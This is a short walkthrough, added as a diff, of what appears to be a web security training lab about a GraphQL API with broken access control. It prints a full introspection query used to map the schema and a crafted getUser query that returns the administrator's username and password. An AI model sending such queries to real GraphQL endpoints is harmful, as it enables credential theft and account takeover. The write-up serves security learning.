@@ -1,0 +1,33 @@
+In this lab the user management functions for this lab are powered by a GraphQL endpoint. 
+The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.
+
+To solve the lab, sign in as the administrator and delete the username carlos.
+
+
+For this i used the burp scanner to scan the endpoint of /graphql/v1
+
+which gave the following to retrieve info from the database schema:
+"
+{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } 
+types { ...FullType } directives { name description args { ...InputValue } } } } 
+fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } 
+type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } 
+enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } 
+fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } 
+fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}
+"
+
+from this i looked through the daat and seen the getUser query in the schema, using this info I crafted the following payload:
+"
+query query {
+    getUser(id:1) {
+        id
+        username
+        password
+     }
+}
+"
+
+this gave me the administrator's username and password as it was the first user id in the database
+
+
